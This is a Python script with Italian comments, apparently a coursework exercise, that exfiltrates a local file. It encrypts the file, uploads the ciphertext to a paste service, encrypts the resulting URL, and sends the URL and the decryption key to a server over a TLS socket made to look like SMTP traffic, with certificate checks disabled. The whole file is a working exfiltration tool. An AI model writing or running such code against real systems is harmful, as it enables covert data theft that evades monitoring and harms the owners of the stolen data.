import socket
import ssl
from cryptography.fernet import Fernet
import pastesAPI.create as create

# Genera una chiave di crittografia
key = Fernet.generate_key()

# Crea un oggetto Fernet utilizzando la chiave, tramite la chiave appena generata (key)
cipher_suite = Fernet(key) # tramite la chiave appena generate si crea il cifrario

key_string = key.decode() #decodifica in stringa i byte della key



#in questa funzione si va a caricare il file esfiltrato in pastes, prendendo come parametro il percorso del file da esfiltrare
def upload_to_pastes(file_path):
    with open(file_path, "r") as file:
        content = file.read()

#faccio le print per comprendere in maniera sistematica cosa succede
    print("\n---------------------------------------------\n")

    print("\tnot encrypted String Content\n" + content) #stampa in chiaro il contenuto del file 

    print("\n---------------------------------------------\n")

    encryptedContent = cipher_suite.encrypt(content.encode()) #in questo modo criptiamo il contenuto del file utilizzando la chiave creata in precedenza
    print("\tencrypted Byte Content\n" + str(encryptedContent)) #stampa il contenuto cifrato 

    print("\n---------------------------------------------\n")

    not_encryptedUrl = create.createPaste(encryptedContent.decode())
    print("\tnot encrypted String Url\n" + not_encryptedUrl) #url di pastes non criptato 

    print("\n---------------------------------------------\n")

    encryptedUrl = cipher_suite.encrypt(not_encryptedUrl.encode())
    print("\tencrypted Byte Url\n" + str(encryptedUrl)) #url di pastes criptato

    print("\n---------------------------------------------\n")

    return (
        encryptedUrl.decode()
    )  # ritorno  l'url come string

         
#in questa funzione mando url e chiave al server criptati
def send_url_server(file, smtp_server, smtp_port):
    # Create the TCP socket
    url = upload_to_pastes(file) #assegno a questa variabile l'url del contenuto caricato su pastes tramite la funzione precedente

    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #creo socket object che mi permette di connettermi al server smtp

#la connessione tramite socket rispetta le linne guida assegnate utilizzando il protocollo sicuro SSL
    try:
        # stabilisco la connessione con il server SMTP prendendo come parametro ip e porta 
        client_socket.connect((smtp_server, smtp_port))

        # creo il contesto SSL, nel nostro caso l'hostname non esiste ed il certificato non è verificato
        context = ssl.create_default_context()
        context.check_hostname = False #poichè il certificato è self signed per varie prove in locale, se avessimo il certificato reale questo non servirebbe
        context.verify_mode = ssl.CERT_NONE

        #In questo caso andiamo a wrappare il nostro socket con il protocollo TLS rendendo la connessione ancora più sicura
        client_socket = context.wrap_socket(client_socket, server_hostname=smtp_server)

        #Viene stabilita la connessione, il client invia un messaggio di connessione accettata al server 
        welcome_message = "220 Hello SMTP Server"
        client_socket.sendall(welcome_message.encode())

        #Il client riceve il messaggio del server
        banner = client_socket.recv(1024).decode()
        print(str(0) + ": " + banner + "\n")
        
        

        #Il client avvia il comando DATA ed inizia il processo di invio di dati al server

        data_command = "DATA\r\n"
        client_socket.sendall(data_command.encode())
        response = client_socket.recv(1024).decode()
        print(str(1) + ": " + response)

        # invio url criptato al server

        client_socket.sendall(url.encode())
 
        # invio una stringa di FINE MESSAGGIO che avverte il server di smettere di leggere i dati 
        client_socket.sendall("\r\nFINE MESSAGGIO\r\n".encode())
        response = client_socket.recv(1024).decode()
        print(str(2) + ": " + response)


        # invio il comando KEY per inizializzare il trasferimento della chiave
        data_command = "KEY\r\n"
        client_socket.sendall(data_command.encode())
        response = client_socket.recv(1024).decode()
        print(str(3) + ": " + response)

        # invio la key
        client_socket.sendall(key_string.encode())\

        # invio il messaggio di FINE KEY 
        client_socket.sendall("\r\nFINE KEY\r\n".encode())
        response = client_socket.recv(1024).decode()
        print(str(4) + ": " + response)

    except socket.error as e:
        print("Connection error:", str(e))
    finally:
        # chiudo il  socket di connessione
        client_socket.close()


# esempi d'uso
filepath = "DataToSend.txt"
smtp_server = "localhost"
smtp_port = 25

with open(filepath, "r+"):
    send_url_server(filepath, smtp_server, smtp_port)
